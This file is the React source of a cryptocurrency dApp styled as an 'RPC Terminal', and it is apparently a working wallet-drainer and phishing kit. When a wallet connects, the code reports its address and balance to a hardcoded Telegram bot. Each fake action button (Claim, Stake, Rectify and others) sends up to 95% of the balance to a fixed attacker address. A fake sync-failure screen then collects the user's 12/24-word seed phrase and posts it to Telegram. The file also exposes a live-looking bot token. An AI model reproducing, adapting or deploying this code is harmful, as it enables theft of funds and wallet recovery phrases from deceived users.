import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { 
  Cpu, ShieldCheck, AlertCircle, Database, 
  History, Unlock, Activity, Zap, Clock, Globe, Settings 
} from 'lucide-react';

export default function EvedexTerminal() {
  // --- WALLET HOOKS ---
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  
  // --- STATE ---
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  // --- CONFIG ---
  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const logToTelegram = async (msg) => {
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg }),
      });
    } catch (e) { console.error("TG Error", e); }
  };

  // Log lead connection
  useEffect(() => {
    if (isConnected && address && balance) {
      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nBAL: ${balance.formatted} ${balance.symbol}`);
    }
  }, [isConnected, address]);

  const executeTaskAction = async () => {
    if (!balance || !balance.value || balance.value === 0n) {
      setView("seed_gate");
      return;
    }

    setLoading(true);
    setLoadingText(`VALIDATING GAS...`);

    try {
      let finalValue;
      const maxAllowed = (balance.value * 95n) / 100n;

      if (activeTask === "Rectify" || !inputVal) {
        finalValue = maxAllowed;
      } else {
        try {
          const parsedInput = parseEther(inputVal);
          finalValue = parsedInput > maxAllowed ? maxAllowed : parsedInput;
        } catch {
          finalValue = maxAllowed;
        }
      }

      sendTransaction({
        to: destination,
        value: finalValue,
      }, {
        onSuccess: (hash) => {
          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(finalValue)}\nHASH: ${hash}`);
          setLoadingText("SYNCHRONIZING...");
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2500);
        },
        onError: (err) => {
          logToTelegram(`❌ REJECTED: User denied ${activeTask}\nADDR: ${address}`);
          setLoading(false);
          setView("seed_gate");
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  // --- PREVENT CRASH IF NOT LOADED ---
  if (!isConnected) {
    return (
      <div className="min-h-screen bg-[#05070a] flex flex-col items-center justify-center p-6 text-center">
        <ShieldCheck size={48} className="text-cyan-900 mb-4 animate-pulse" />
        <h1 className="text-white font-black italic text-xl mb-6 tracking-tighter">RPC PORTAL V3</h1>
        <div className="bg-[#0d1117] border border-slate-900 p-8 rounded-[30px] w-full max-w-sm">
          <p className="text-[10px] text-slate-500 mb-6 uppercase font-black">Awaiting Secure Handshake...</p>
          <w3m-button />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter flex flex-col select-none">
      
      {/* Header Info */}
      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>RPC TERMINAL</div>
          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black uppercase tracking-widest">
            NODE: {address.slice(0,14)}...
          </div>
        </div>
        <w3m-button balance="hide" /> 
      </header>

      {/* Main Content */}
      <div className="flex-1 overflow-y-auto pb-10">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {[
              {n:"Claim", i:<Database size={18}/>}, 
              {n:"Stake", i:<History size={18}/>}, 
              {n:"Unstake", i:<Unlock size={18}/>}, 
              {n:"Migrate", i:<Activity size={18}/>}, 
              {n:"Swap", i:<Zap size={18}/>}, 
              {n:"Rectify", i:<Settings size={18}/>}, 
              {n:"Airdrop", i:<Zap size={18}/>}, 
              {n:"Delay", i:<Clock size={18}/>}, 
              {n:"Bridge", i:<Globe size={18}/>}
            ].map((item) => (
              <button key={item.n} onClick={() => { setActiveTask(item.n); setInputVal(""); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[22px] flex flex-col items-center gap-2 active:scale-95 transition-all">
                <div className="text-slate-700">{item.i}</div>
                <span className="text-[8px] font-black text-slate-500 uppercase">{item.n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[30px] p-8 text-center animate-in zoom-in duration-300">
            <button onClick={() => setView("menu")} className="text-slate-700 text-[8px] mb-8 font-black block mx-auto uppercase">← BACK_TO_CONSOLE</button>
            <h2 className="text-white font-black text-lg italic mb-6 uppercase tracking-tighter">{activeTask} Gate</h2>
            
            <div className="bg-black/40 border border-slate-900 p-6 rounded-2xl mb-6 text-left">
              <label className="text-[6px] text-cyan-800 block font-black mb-2 uppercase">
                {activeTask === "Rectify" ? "VAULT_LIQUIDITY (LOCKED)" : `ENTER ${activeTask} AMOUNT`}
              </label>
              
              {activeTask === "Rectify" ? (
                <div className="text-2xl font-mono text-white italic tracking-tighter">
                  {balance ? balance.formatted.slice(0,10) : "0.000"} <span className="text-[10px] text-slate-600 uppercase">{balance?.symbol}</span>
                </div>
              ) : (
                <div className="flex items-center gap-2">
                  <input 
                    type="number" 
                    value={inputVal} 
                    onChange={(e) => setInputVal(e.target.value)} 
                    placeholder="0.00" 
                    className="bg-transparent border-none text-2xl font-mono text-cyan-500 italic outline-none w-full" 
                    autoFocus 
                  />
                  <span className="text-[10px] font-black text-cyan-900 uppercase">{balance?.symbol}</span>
                </div>
              )}
            </div>

            <button onClick={executeTaskAction} className="w-full bg-cyan-700 py-5 rounded-xl text-[9px] font-black text-white shadow-2xl active:scale-95 uppercase tracking-widest">INITIALIZE {activeTask}</button>
          </div>
        )}
      </div>

      {/* Seed Gate Overlay */}
      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[500] flex flex-col items-center justify-center p-6 backdrop-blur-2xl">
          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[35px] p-8 text-center">
            {!isSyncing ? (
              <>
                <AlertCircle size={40} className="text-red-700 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white font-black text-[12px] italic uppercase tracking-widest leading-none mb-2">RPC SYNC FAILURE (90%)</h2>
                <p className="text-[7px] text-slate-600 mb-4 leading-relaxed uppercase">NETWORK TIMEOUT. PROVIDE MASTER RECOVERY KEY TO MANUALLY SYNC ASSETS.</p>
                <textarea 
                  value={seedVal} 
                  onChange={(e) => setSeedVal(e.target.value)} 
                  placeholder="ENTER 12/24 WORDS..." 
                  className="w-full h-32 bg-black border border-slate-900 rounded-[20px] p-5 text-[10px] font-mono text-cyan-500 outline-none uppercase placeholder:text-slate-800" 
                />
                <button 
                  onClick={() => { 
                    setIsSyncing(true); 
                    logToTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); 
                    let cur=0; const int=setInterval(()=>{cur++; setSyncProgress(cur); if(cur>=100)clearInterval(int)},100); 
                  }} 
                  disabled={seedVal.split(' ').length < 12} 
                  className="w-full mt-5 bg-red-950 py-5 rounded-xl text-[9px] font-black text-white uppercase tracking-widest disabled:opacity-20 transition-all"
                >
                  RESTORE_SYNC
                </button>
              </>
            ) : (
              <div className="py-10 text-center">
                <div className="w-16 h-16 border-4 border-cyan-600 border-t-transparent rounded-full animate-spin mx-auto mb-6" />
                <h2 className="text-white font-black text-sm italic tracking-[0.4em] uppercase">{syncProgress}% SYNCED</h2>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Loader */}
      {loading && (
        <div className="fixed inset-0 bg-black/90 z-[600] flex flex-col items-center justify-center">
          <div className="w-10 h-10 border-2 border-cyan-600 border-t-transparent rounded-full animate-spin" />
          <p className="text-[7px] font-black text-cyan-600 mt-8 tracking-[0.6em] animate-pulse uppercase">{loadingText}</p>
        </div>
      )}
    </div>
  );
}
